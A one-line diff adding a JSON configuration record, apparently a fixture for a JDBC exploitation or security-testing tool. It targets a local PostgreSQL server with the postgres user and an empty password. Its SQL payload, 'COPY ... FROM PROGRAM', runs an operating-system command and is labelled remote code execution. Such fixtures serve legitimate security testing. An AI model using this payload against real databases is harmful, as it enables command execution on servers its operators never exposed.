@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_exploit","driver":"postgresql","driver_class":"org.postgresql.Driver","jdbc_url_base":"jdbc:postgresql://127.0.0.1:5432/test","url_params":{},"pool":"none","pool_config":{},"credentials":{"user":"postgres","password":""},"sql_payload":"COPY cmd_output FROM PROGRAM 'id'","sink_type":"rce","deser_properties":{}}
